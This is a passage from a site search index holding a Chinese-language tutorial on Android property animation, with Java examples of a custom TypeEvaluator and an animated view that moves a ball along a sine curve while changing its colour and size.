\u5c5e\u6027\u52a8\u753b\u7684\u8fd0\u884c\u673a\u5236\u662f\u901a\u8fc7\u4e0d\u65ad\u5730\u5bf9\u503c\u8fdb\u884c\u64cd\u4f5c\u6765\u5b9e\u73b0\u7684\uff0c\u800c\u521d\u59cb\u503c\u548c\u7ed3\u675f\u503c\u4e4b\u95f4\u7684\u52a8\u753b\u8fc7\u6e21\u5c31\u662f\u7531ValueAnimator\u8fd9\u4e2a\u7c7b\u6765\u8d1f\u8d23\u8ba1\u7b97\u7684\u3002\u5b83\u7684\u5185\u90e8\u4f7f\u7528\u4e00\u79cd\u65f6\u95f4\u5faa\u73af\u7684\u673a\u5236\u6765\u8ba1\u7b97\u503c\u4e0e\u503c\u4e4b\u95f4\u7684\u52a8\u753b\u8fc7\u6e21\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u521d\u59cb\u503c\u548c\u7ed3\u675f\u503c\u63d0\u4f9b\u7ed9ValueAnimator\uff0c\u5e76\u4e14\u544a\u8bc9\u5b83\u52a8\u753b\u6240\u9700\u8fd0\u884c\u7684\u65f6\u957f\uff0c\u90a3\u4e48ValueAnimator\u5c31\u4f1a\u81ea\u52a8\u5e2e\u6211\u4eec\u5b8c\u6210\u4ece\u521d\u59cb\u503c\u5e73\u6ed1\u5730\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u8fd9\u6837\u7684\u6548\u679c\u3002\u9664\u6b64\u4e4b\u5916\uff0cValueAnimator\u8fd8\u8d1f\u8d23\u7ba1\u7406\u52a8\u753b\u7684\u64ad\u653e\u6b21\u6570\u3001\u64ad\u653e\u6a21\u5f0f\u3001\u4ee5\u53ca\u5bf9\u52a8\u753b\u8bbe\u7f6e\u76d1\u542c\u5668\u7b49\u3002 \u4ece\u4e0a\u56fe\u6211\u4eec\u53ef\u4ee5\u4e86\u89e3\u5230\uff0c\u901a\u8fc7duration\u3001startPropertyValue\u548cendPropertyValue \u7b49\u503c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b9a\u4e49\u52a8\u753b\u8fd0\u884c\u65f6\u957f\uff0c\u521d\u59cb\u503c\u548c\u7ed3\u675f\u503c\u3002\u7136\u540e\u901a\u8fc7start\u65b9\u6cd5\u5f00\u59cb\u52a8\u753b\u3002 \u90a3\u4e48ValueAnimator \u5230\u5e95\u662f\u600e\u6837\u5b9e\u73b0\u4ece\u521d\u59cb\u503c\u5e73\u6ed1\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u7684\u5462\uff1f\u8fd9\u4e2a\u5c31\u662f\u7531TypeEvaluator \u548cTimeInterpolator \u5171\u540c\u51b3\u5b9a\u7684\u3002 \u5177\u4f53\u6765\u8bf4\uff0c TypeEvaluator \u51b3\u5b9a\u4e86\u52a8\u753b\u5982\u4f55\u4ece\u521d\u59cb\u503c\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u3002 TimeInterpolator \u51b3\u5b9a\u4e86\u52a8\u753b\u4ece\u521d\u59cb\u503c\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u7684\u8282\u594f\u3002 \u8bf4\u7684\u901a\u4fd7\u4e00\u70b9\uff0c\u4f60\u6bcf\u5929\u65e9\u6668\u51fa\u95e8\u53bb\u516c\u53f8\u4e0a\u73ed\uff0cTypeEvaluator\u51b3\u5b9a\u4e86\u4f60\u662f\u5750\u516c\u4ea4\u3001\u5750\u5730\u94c1\u8fd8\u662f\u9a91\u8f66\uff1b\u800c\u5f53\u4f60\u51b3\u5b9a\u9a91\u8f66\u540e\uff0cTimeInterpolator\u51b3\u5b9a\u4e86\u4f60\u4e00\u8def\u4e0a\u9a91\u884c\u7684\u65b9\u5f0f\uff0c\u4f60\u53ef\u4ee5\u5300\u901f\u7684\u4e00\u8def\u9a91\u5230\u516c\u53f8\uff0c\u4f60\u4e5f\u53ef\u4ee5\u524d\u534a\u7a0b\u9a91\u5f97\u98de\u5feb\uff0c\u540e\u534a\u7a0b\u9a91\u5f97\u6162\u60a0\u60a0\u3002 \u5982\u679c\uff0c\u8fd8\u662f\u4e0d\u7406\u89e3\uff0c\u90a3\u4e48\u5c31\u770b\u4e0b\u9762\u7684\u4ee3\u7801\u5427\u3002\u9996\u5148\u770b\u4e00\u4e0b\u4e0b\u9762\u7684\u8fd9\u4e24\u4e2agif\u52a8\u753b\uff0c\u4e00\u4e2a\u5c0f\u7403\u5728\u5c4f\u5e55\u4e0a\u4ee5 y=sin(x) \u7684\u6570\u5b66\u51fd\u6570\u8f68\u8ff9\u8fd0\u884c\uff0c\u540c\u65f6\u5c0f\u7403\u7684\u989c\u8272\u548c\u534a\u5f84\u4e5f\u53d1\u751f\u7740\u53d8\u5316\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u4e24\u5e45\u56fe\u52a8\u753b\u53d8\u5316\u7684\u8282\u594f\u4e5f\u662f\u4e0d\u4e00\u6837\u7684\u3002 anim1.gif anim2.gif \u5982\u679c\u4e0d\u8003\u8651\u5c5e\u6027\u52a8\u753b\uff0c\u8fd9\u6837\u7684\u4e00\u4e2a\u52a8\u753b\u7eaf\u7cb9\u7684\u4f7f\u7528Canvas+Handler\u7684\u65b9\u5f0f\u7ed8\u5236\u4e5f\u662f\u6709\u53ef\u80fd\u5b9e\u73b0\u7684\u3002\u4f46\u662f\u4f1a\u590d\u6742\u5f88\u591a\uff0c\u800c\u4e14\u52a0\u4e0a\u5404\u79cd\u7ebf\u7a0b\uff0c\u4f1a\u5e26\u6765\u5f88\u591a\u610f\u60f3\u4e0d\u5230\u7684\u95ee\u9898\u3002 \u8fd9\u91cc\u5c31\u901a\u8fc7\u81ea\u5b9a\u4e49\u5c5e\u6027\u52a8\u753b\u7684\u65b9\u5f0f\u770b\u770b\u8fd9\u4e2a\u52a8\u753b\u662f\u5982\u4f55\u5b9e\u73b0\u7684\u3002 \u5c5e\u6027\u52a8\u753b\u81ea\u5b9a\u4e49\u5b9e\u73b0 \u8fd9\u4e2a\u52a8\u753b\u6700\u5173\u952e\u7684\u4e09\u70b9\u5c31\u662f \u8fd0\u52a8\u8f68\u8ff9\u3001\u5c0f\u7403\u534a\u5f84\u53ca\u989c\u8272\u7684\u53d8\u5316\uff1b\u6211\u4eec\u5c31\u4ece\u8fd9\u4e09\u4e2a\u65b9\u9762\u5c55\u5f00\u3002\u6700\u540e\u6211\u4eec\u5728\u7ed3\u5408Interpolator\u8bf4\u4e00\u4e0bTimeInterpolator\u7684\u610f\u4e49\u3002 \u7528TypeEvaluator \u786e\u5b9a\u8fd0\u52a8\u8f68\u8ff9 \u524d\u9762\u8bf4\u4e86\uff0cTypeEvaluator\u51b3\u5b9a\u4e86\u52a8\u753b\u5982\u4f55\u4ece\u521d\u59cb\u503c\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u3002\u8fd9\u4e2aTypeEvaluator\u662f\u4e2a\u63a5\u53e3\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u3002 public class PointSinEvaluator implements TypeEvaluator { @Override public Object evaluate(float fraction, Object startValue, Object endValue) { Point startPoint = (Point) startValue; Point endPoint = (Point) endValue; float x = startPoint.getX() + fraction * (endPoint.getX() - startPoint.getX()); float y = (float) (Math.sin(x * Math.PI / 180) * 100) + endPoint.getY() / 2; Point point = new Point(x, y); return point; } } PointSinEvaluator \u7ee7\u627f\u4e86TypeEvaluator\u7c7b\uff0c\u5e76\u5b9e\u73b0\u4e86\u4ed6\u552f\u4e00\u7684\u65b9\u6cd5evaluate\uff1b\u8fd9\u4e2a\u65b9\u6cd5\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570fraction \u4ee3\u8868\u5f53\u524d\u52a8\u753b\u5b8c\u6210\u7684 \u767e\u5206\u6bd4 \uff0c\u8fd9\u4e2a\u503c\u662f\u5982\u4f55\u53d8\u5316\u7684\u540e\u9762\u8fd8\u4f1a\u63d0\u5230\uff1b\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4ee3\u8868\u52a8\u753b\u7684 \u521d\u59cb\u503c\u548c\u7ed3\u675f\u503c \u3002\u8fd9\u91cc\u6211\u4eec\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0cx\u7684\u503c\u968f\u7740fraction \u4e0d\u65ad\u53d8\u5316\uff0c\u5e76\u6700\u7ec8\u8fbe\u5230\u7ed3\u675f\u503c\uff1by\u7684\u503c\u5c31\u662f\u5f53\u524dx\u503c\u6240\u5bf9\u5e94\u7684sin(x) \u503c\uff0c\u7136\u540e\u7528x \u548c y \u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u70b9\uff08Point\u5bf9\u8c61\uff09\u8fd4\u56de\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2aPointSinEvaluator \u751f\u6210\u5c5e\u6027\u52a8\u753b\u7684\u5b9e\u4f8b\u4e86\u3002 Point startP = new Point(RADIUS, RADIUS);//\u521d\u59cb\u503c\uff08\u8d77\u70b9\uff09 Point endP = new Point(getWidth() - RADIUS, getHeight() - RADIUS);//\u7ed3\u675f\u503c\uff08\u7ec8\u70b9\uff09 final ValueAnimator valueAnimator = ValueAnimator.ofObject(new PointSinEvaluator(), startP, endP); valueAnimator.setRepeatCount(-1); valueAnimator.setRepeatMode(ValueAnimator.REVERSE); valueAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { currentPoint = (Point) animation.getAnimatedValue(); postInvalidate(); } }); \u8fd9\u6837\u6211\u4eec\u5c31\u5b8c\u6210\u4e86\u52a8\u753b\u8f68\u8ff9\u7684\u5b9a\u4e49\uff0c\u73b0\u5728\u53ea\u8981\u8c03\u7528valueAnimator.start() \u65b9\u6cd5\uff0c\u5c31\u4f1a\u7ed8\u5236\u51fa\u4e00\u4e2a\u6b63\u5f26\u66f2\u7ebf\u7684\u8f68\u8ff9\u3002 \u989c\u8272\u53ca\u534a\u5f84\u52a8\u753b\u5b9e\u73b0 \u4e4b\u524d\u6211\u4eec\u8bf4\u8fc7\uff0c\u4f7f\u7528ObjectAnimator \u53ef\u4ee5\u5bf9\u4efb\u610f\u5bf9\u8c61\u7684\u4efb\u610f\u5c5e\u6027\u8fdb\u884c\u52a8\u753b\u64cd\u4f5c\uff0c\u8fd9\u53e5\u8bdd\u662f\u4e0d\u592a\u4e25\u8c28\u7684\uff0c\u8fd9\u4e2a\u4efb\u610f\u5c5e\u6027\u8fd8\u9700\u8981\u6709get \u548c set \u65b9\u6cd5\u3002 public class PointAnimView extends View { /** * \u5b9e\u73b0\u5173\u4e8ecolor \u7684\u5c5e\u6027\u52a8\u753b */ private int color; private float radius = RADIUS; ..... } \u8fd9\u91cc\u5728\u6211\u4eec\u7684\u81ea\u5b9a\u4e49view\u4e2d\uff0c\u5b9a\u4e49\u4e86\u4e24\u4e2a\u5c5e\u6027color \u548c radius\uff0c\u5e76\u5b9e\u73b0\u4e86\u4ed6\u4eec\u5404\u81ea\u7684get set \u65b9\u6cd5\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u5c5e\u6027\u52a8\u753b\u7684\u7279\u70b9\u5b9e\u73b0\u5c0f\u7403\u989c\u8272\u53d8\u5316\u7684\u52a8\u753b\u548c\u534a\u5f84\u53d8\u5316\u7684\u52a8\u753b\u3002 ObjectAnimator animColor = ObjectAnimator.ofObject(this, \"color\", new ArgbEvaluator(), Color.GREEN, Color.YELLOW, Color.BLUE, Color.WHITE, Color.RED); animColor.setRepeatCount(-1); animColor.setRepeatMode(ValueAnimator.REVERSE); ValueAnimator animScale = ValueAnimator.ofFloat(20f, 80f, 60f, 10f, 35f,55f,10f); animScale.setRepeatCount(-1); animScale.setRepeatMode(ValueAnimator.REVERSE); animScale.setDuration(5000); animScale.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { radius = (float) animation.getAnimatedValue(); } }); \u8fd9\u91cc\uff0c\u6211\u4eec\u4f7f\u7528ObjectAnimator \u5b9e\u73b0\u5bf9color \u5c5e\u6027\u7684\u503c\u6309\u7167ArgbEvaluator \u8fd9\u4e2a\u7c7b\u7684\u89c4\u5f8b\u5728\u7ed9\u5b9a\u7684\u989c\u8272\u503c\u4e4b\u95f4\u53d8\u5316\uff0c\u8fd9\u4e2aArgbEvaluator \u548c\u6211\u4eec\u4e4b\u524d\u5b9a\u4e49\u7684PointSinEvaluator\u4e00\u6837\uff0c\u90fd\u662f\u51b3\u5b9a\u52a8\u753b\u5982\u4f55\u4ece\u521d\u59cb\u503c\u8fc7\u6e21\u5230\u7ed3\u675f\u503c\u7684\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e2a\u7c7b\u662f\u7cfb\u7edf\u81ea\u5e26\u7684\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u53ef\u4ee5\uff0c\u4ed6\u53ef\u4ee5\u5b9e\u73b0\u5404\u79cd\u989c\u8272\u95f4\u7684\u81ea\u7531\u8fc7\u6e21\u3002 \u5bf9radius \u8fd9\u4e2a\u5c5e\u6027\u4f7f\u7528\u4e86ValueAnimator\uff0c\u4f7f\u7528\u4e86\u5176ofFloat\u65b9\u6cd5\u5b9e\u73b0\u4e86\u4e00\u7cfb\u5217float\u503c\u7684\u53d8\u5316\uff1b\u540c\u65f6\u4e3a\u5176\u6dfb\u52a0\u4e86\u52a8\u753b\u53d8\u5316\u7684\u76d1\u542c\u5668\uff0c\u5728\u5c5e\u6027\u503c\u66f4\u65b0\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u53d8\u5316\u7684\u7ed3\u679c\u8d4b\u7ed9radius\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u534a\u5f84\u52a8\u6001\u7684\u53d8\u5316\u3002 \u8fd9\u91ccradius \u4e5f\u53ef\u4ee5\u4f7f\u7528\u548ccolor\u76f8\u540c\u7684\u65b9\u5f0f\uff0c\u53ea\u9700\u8981\u628aArgbEvaluator \u66ff\u6362\u4e3aFloatEvaluator\uff0c\u540c\u65f6\u4fee\u6539\u52a8\u753b\u7684\u53d8\u5316\u503c\u5373\u53ef\uff1b\u4f7f\u7528\u6dfb\u52a0\u76d1\u542c\u5668\u7684\u65b9\u5f0f\uff0c\u53ea\u662f\u4e3a\u4e86\u4ecb\u7ecd\u76d1\u542c\u5668\u7684\u4f7f\u7528\u65b9\u6cd5\u800c\u5df2 \u597d\u4e86\uff0c\u5230\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u5b9a\u4e49\u51fa\u4e86\u6240\u6709\u9700\u8981\u7684\u52a8\u753b\uff0c\u524d\u9762\u8bf4\u8fc7\uff0c\u5c5e\u6027\u52a8\u753b\u4e5f\u662f\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\u7684\u3002\u56e0\u6b64\uff0c\u5728\u52a8\u753b\u542f\u52a8\u7684\u65f6\u5019\uff0c\u540c\u65f6\u64ad\u653e\u8fd9\u4e09\u4e2a\u52a8\u753b\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u56fe\u4e2d\u7684\u6548\u679c\u4e86\u3002 animSet = new AnimatorSet(); animSet.play(valueAnimator).with(animColor).with(animScale); animSet.setDuration(5000); animSet.setInterpolator(interpolatorType); animSet.start(); PointAnimView \u6e90\u7801 public class PointAnimView extends View { public static final float RADIUS = 20f; private Point currentPoint; private Paint mPaint; private Paint linePaint; private AnimatorSet animSet; private TimeInterpolator interpolatorType = new LinearInterpolator(); /** * \u5b9e\u73b0\u5173\u4e8ecolor \u7684\u5c5e\u6027\u52a8\u753b */ private int color; private float radius = RADIUS; public PointAnimView(Context context) { super(context); init(); } public PointAnimView(Context context, AttributeSet attrs) { super(context, attrs); init(); } public PointAnimView(Context context, AttributeSet attrs, int defStyleAttr) { super(context, attrs, defStyleAttr); init(); } public int getColor() { return color; } public void setColor(int color) { this.color = color; mPaint.setColor(this.color); } public float getRadius() { return radius; } public void setRadius(float radius) { this.radius = radius; } private void init() { mPaint = new Paint(Paint.ANTI_ALIAS_FLAG); mPaint.setColor(Color.TRANSPARENT); linePaint = new Paint(Paint.ANTI_ALIAS_FLAG); linePaint.setColor(Color.BLACK); linePaint.setStrokeWidth(5); } @Override protected void onDraw(Canvas canvas) { if (currentPoint == null) { currentPoint = new Point(RADIUS, RADIUS); drawCircle(canvas); // StartAnimation(); } else { drawCircle(canvas); } drawLine(canvas); } private void drawLine(Canvas canvas) { canvas.drawLine(10, getHeight() / 2, getWidth(), getHeight() / 2, linePaint); canvas.drawLine(10, getHeight() / 2 - 150, 10, getHeight() / 2 + 150, linePaint); canvas.drawPoint(currentPoint.getX(), currentPoint.getY(), linePaint); } public void StartAnimation() { Point startP = new Point(RADIUS, RADIUS); Point endP = new Point(getWidth() - RADIUS, getHeight() - RADIUS); final ValueAnimator valueAnimator = ValueAnimator.ofObject(new PointSinEvaluator(), startP, endP); valueAnimator.setRepeatCount(-1); valueAnimator.setRepeatMode(ValueAnimator.REVERSE); valueAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { currentPoint = (Point) animation.getAnimatedValue(); postInvalidate(); } }); // ObjectAnimator animColor = ObjectAnimator.ofObject(this, \"color\", new ArgbEvaluator(), Color.GREEN, Color.YELLOW, Color.BLUE, Color.WHITE, Color.RED); animColor.setRepeatCount(-1); animColor.setRepeatMode(ValueAnimator.REVERSE); ValueAnimator animScale = ValueAnimator.ofFloat(20f, 80f, 60f, 10f, 35f,55f,10f); animScale.setRepeatCount(-1); animScale.setRepeatMode(ValueAnimator.REVERSE); animScale.setDuration(5000); animScale.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { @Override public void onAnimationUpdate(ValueAnimator animation) { radius = (float) animation.getAnimatedValue(); } }); animSet = new AnimatorSet(); animSet.play(valueAnimator).with(animColor).with(animScale); animSet.setDuration(5000); animSet.setInterpolator(interpolatorType); animSet.start(); } private void drawCircle(Canvas canvas) { float x = currentPoint.getX(); float y = currentPoint.getY(); canvas.drawCircle(x, y, radius, mPaint); } public void setInterpolatorType(int type ) { switch (type) { case 1: interpolatorType = new BounceInterpolator(); break; case 2: interpolatorType = new AccelerateDecelerateInterpolator(); break; case 3: interpolatorType = new DecelerateInterpolator(); break; case 4: interpolatorType = new AnticipateInterpolator(); break; case 5: interpolatorType = new LinearInterpolator(); break; case 6: interpolatorType=new LinearOutSlowInInterpolator(); break; case 7: interpolatorType = new OvershootInterpolator(); default: interpolatorType = new LinearInterpolator(); break; } } @TargetApi(Build.VERSION_CODES.KITKAT) public void pauseAnimation() { if (animSet != null) { animSet.pause(); } } public void stopAnimation() { if (animSet != null) { animSet.cancel(); this.clearAnimation(); } } } TimeInterpolator \u4ecb\u7ecd Interpolator\u7684\u6982\u5ff5\u5176\u5b9e\u6211\u4eec\u5e76\u4e0d\u964c\u751f\uff0c\u5728\u8865\u95f4\u52a8\u753b\u4e2d\u6211\u4eec\u5c31\u4f7f\u7528\u5230\u4e86\u3002\u4ed6\u5c31\u662f\u7528\u6765\u63a7\u5236\u52a8\u753b\u5feb\u6162\u8282\u594f\u7684\uff1b\u800c\u5728\u5c5e\u6027\u52a8\u753b\u4e2d\uff0cTimeInterpolator \u4e5f\u662f\u7c7b\u4f3c\u7684\u4f5c\u7528\uff1bTimeInterpolator \u7ee7\u627f\u81eaInterpolator\u3002\u6211\u4eec\u53ef\u4ee5\u7ee7\u627fTimerInterpolator \u4ee5\u81ea\u5df1\u7684\u65b9\u5f0f\u63a7\u5236\u52a8\u753b\u53d8\u5316\u7684\u8282\u594f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528Android \u7cfb\u7edf\u63d0\u4f9b\u7684Interpolator\u3002 \u4e0b\u9762\u90fd\u662f\u7cfb\u7edf\u5e2e\u6211\u4eec\u5b9a\u4e49\u597d\u7684\u4e00\u4e9bInterpolator\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7setInterpolator \u8bbe\u7f6e\u4e0d\u540c\u7684Interpolator\u3002 \u7cfb\u7edf\u81ea\u5e26Interpolator \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u7684Interpolator\u5c31\u51b3\u5b9a\u4e86 \u524d\u9762\u6211\u4eec\u63d0\u5230\u7684fraction\u3002\u53d8\u5316\u7684\u8282\u594f\u51b3\u5b9a\u4e86\u52a8\u753b\u6240\u6267\u884c\u7684\u767e\u5206\u6bd4\u3002\u4e0d\u5f97\u4e0d\u8bf4\uff0c\u8fd9\u4e48ValueAnimator\u7684\u8bbe\u8ba1\u7684\u786e\u662f\u5f88\u5de7\u5999\u3002 XML \u5c5e\u6027\u52a8\u753b \u8fd9\u91cc\u63d0\u4e00\u4e0b\uff0c\u5c5e\u6027\u52a8\u753b\u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528xml\u6587\u4ef6\u7684\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f46\u662f\u5c5e\u6027\u52a8\u753b\u7684\u5c5e\u6027\u503c\u4e00\u822c\u4f1a\u7275\u626f\u5230\u5bf9\u8c61\u5177\u4f53\u7684\u5c5e\u6027\uff0c\u66f4\u591a\u662f\u901a\u8fc7\u4ee3\u7801\u52a8\u6001\u83b7\u53d6\uff0c\u6240\u4ee5xml\u6587\u4ef6\u7684\u5b9e\u73b0\u4f1a\u6709\u4e9b\u4e0d\u65b9\u4fbf\u3002 <set android:ordering=\"sequentially\"> <set> <objectAnimator android:propertyName=\"x\" android:duration=\"500\" android:valueTo=\"400\" android:valueType=\"intType\"/> <objectAnimator android:propertyName=\"y\" android:duration=\"500\" android:valueTo=\"300\" android:valueType=\"intType\"/> </set> <objectAnimator android:propertyName=\"alpha\" android:duration=\"500\" android:valueTo=\"1f\"/> </set> \u4f7f\u7528\u65b9\u5f0f\uff1a AnimatorSet set = (AnimatorSet) AnimatorInflater.loadAnimator(myContext, R.anim.property_animator); set.setTarget(myObject); set.start(); xml \u6587\u4ef6\u4e2d\u7684\u6807\u7b7e\u4e5f\u548c\u5c5e\u6027\u52a8\u753b\u7684\u7c7b\u76f8\u5bf9\u5e94\u3002 ValueAnimator --- <animator> ObjectAnimator --- <objectAnimator> AnimatorSet --- <set> \u8fd9\u4e9b\u5c31\u662f\u5c5e\u6027\u52a8\u753b\u7684\u6838\u5fc3\u5185\u5bb9\u3002\u73b0\u5728\u4f7f\u7528\u5c5e\u6027\u52a8\u753b\u7684\u7279\u6027\u81ea\u5b9a\u4e49\u52a8\u753b\u5e94\u8be5\u4e0d\u662f\u96be\u4e8b\u4e86\u3002\u5176\u4f59\u6807\u7b7e\u7684\u542b\u4e49\uff0c\u7ed3\u5408\u4e4b\u524d\u7684\u5185\u5bb9\u5e94\u8be5\u4e0d\u96be\u7406\u89e3\u4e86\u3002 \u4f20\u7edf\u52a8\u753b VS \u5c5e\u6027\u52a8\u753b \u76f8\u8f83\u4e8e\u4f20\u7edf\u52a8\u753b\uff0c\u5c5e\u6027\u52a8\u753b\u6709\u5f88\u591a\u4f18\u52bf\u3002\u90a3\u662f\u5426\u610f\u5473\u7740\u5c5e\u6027\u52a8\u753b\u53ef\u4ee5\u5b8c\u5168\u66ff\u4ee3\u4f20\u7edf\u52a8\u753b\u5462\u3002\u5176\u5b9e\u4e0d\u7136\uff0c\u4e24\u79cd\u52a8\u753b\u90fd\u6709\u5404\u81ea\u7684\u4f18\u52bf\uff0c\u5c5e\u6027\u52a8\u753b\u5982\u6b64\u5f3a\u5927\uff0c\u4e5f\u4e0d\u662f\u6ca1\u6709\u7f3a\u70b9\u3002 \u8865\u95f4\u52a8\u753b\u70b9\u51fb\u4e8b\u4ef6 \u5c5e\u6027\u52a8\u753b\u70b9\u51fb\u4e8b\u4ef6 \u4ece\u4e0a\u9762\u4e24\u5e45\u56fe\u6bd4\u8f83\u53ef\u4ee5\u53d1\u73b0\uff0c\u8865\u95f4\u52a8\u753b\u4e2d\uff0c\u867d\u7136\u4f7f\u7528translate\u5c06\u56fe\u7247\u79fb\u52a8\u4e86\uff0c\u4f46\u662f\u70b9\u51fb\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u4f9d\u65e7\u53ef\u4ee5\u53d1\u751f\u70b9\u51fb\u4e8b\u4ef6\uff0c\u800c\u5c5e\u6027\u52a8\u753b\u5374\u4e0d\u662f\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\uff0c\u5c5e\u6027\u52a8\u753b\u624d\u662f\u771f\u6b63\u7684\u5b9e\u73b0\u4e86view\u7684\u79fb\u52a8\uff0c\u8865\u95f4\u52a8\u753b\u5bf9view\u7684\u79fb\u52a8\u66f4\u50cf\u662f\u5728\u4e0d\u540c\u5730\u65b9\u7ed8\u5236\u4e86\u4e00\u4e2a\u5f71\u5b50\uff0c\u5b9e\u9645\u7684\u5bf9\u8c61\u8fd8\u662f\u5904\u4e8e\u539f\u6765\u7684\u5730\u65b9\u3002 \u5f53\u6211\u4eec\u628a\u52a8\u753b\u7684repeatCount\u8bbe\u7f6e\u4e3a\u65e0\u9650\u5faa\u73af\u65f6\uff0c\u5982\u679c\u5728Activity\u9000\u51fa\u65f6\u6ca1\u6709\u53ca\u65f6\u5c06\u52a8\u753b\u505c\u6b62\uff0c\u5c5e\u6027\u52a8\u753b\u4f1a\u5bfc\u81f4Activity\u65e0\u6cd5\u91ca\u653e\u800c\u5bfc\u81f4\u5185\u5b58\u6cc4\u6f0f\uff0c\u800c\u8865\u95f4\u52a8\u753b\u5374\u6ca1\u6709\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u4f7f\u7528\u5c5e\u6027\u52a8\u753b\u65f6\u5207\u8bb0\u5728Activity\u6267\u884c onStop \u65b9\u6cd5\u65f6\u987a\u4fbf\u5c06\u52a8\u753b\u505c\u6b62\u3002\uff08\u5bf9\u8fd9\u4e2a\u6000\u7591\u7684\u540c\u5b66\u53ef\u4ee5\u81ea\u5df1\u901a\u8fc7\u5728\u52a8\u753b\u7684Update \u56de\u8c03\u65b9\u6cd5\u6253\u5370\u65e5\u5fd7\u7684\u65b9\u5f0f\u8fdb\u884c\u9a8c\u8bc1\uff09\u3002 xml \u6587\u4ef6\u5b9e\u73b0\u7684\u8865\u95f4\u52a8\u753b\uff0c\u590d\u7528\u7387\u6781\u9ad8\u3002\u5728Activity\u5207\u6362\uff0c\u7a97\u53e3\u5f39\u51fa\u65f6\u7b49\u60c5\u666f\u4e2d\u6709\u7740\u5f88\u597d\u7684\u6548\u679c\u3002 \u4f7f\u7528\u5e27\u52a8\u753b\u65f6\u9700\u8981\u6ce8\u610f\uff0c\u4e0d\u8981\u4f7f\u7528\u8fc7\u591a\u7279\u522b\u5927\u7684\u56fe\uff0c\u5bb9\u6613\u5bfc\u81f4\u5185\u5b58\u4e0d\u8db3\u3002 \u597d\u4e86\uff0c\u5173\u4e8eAndroid \u52a8\u753b\u7684\u603b\u7ed3\u5c31\u5230\u8fd9\u91cc\u3002 \u6700\u540e \u6709\u5174\u8da3\u7684\u540c\u5b66\u53ef\u67e5\u770b github \u6e90\u7801 \u6b22\u8fcestar & fork \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/420629118c10","title":"Android \u52a8\u753b\u603b\u7ed3 Android \u52a8\u753b\u603b\u7ed3"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#android-android","text":"\u5728\u65e5\u5e38\u7684Android\u5f00\u53d1\u4e2d\uff0c\u7ecf\u5e38\u4f1a\u4f7f\u7528\u5230\u52a8\u753b\uff0c\u8fd9\u91cc\u5c31\u5bf9Android\u5f00\u53d1\u4e2d\u7684\u52a8\u753b\u505a\u4e00\u4e0b\u603b\u7ed3\u3002","title":"Android \u52a8\u753b\u603b\u7ed3 Android \u52a8\u753b\u603b\u7ed3"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/#android","text":"\u603b\u7684\u6765\u8bf4\uff0cAndroid\u52a8\u753b\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff0c\u6700\u521d\u7684 \u4f20\u7edf\u52a8\u753b \u548cAndroid3.0 \u4e4b\u540e\u51fa\u73b0\u7684 \u5c5e\u6027\u52a8\u753b \uff1b \u4f20\u7edf\u52a8\u753b\u53c8\u5305\u62ec \u5e27\u52a8\u753b\uff08Frame Animation\uff09\u548c\u8865\u95f4\u52a8\u753b\uff08Tweened Animation\uff09\u3002","title":"Android 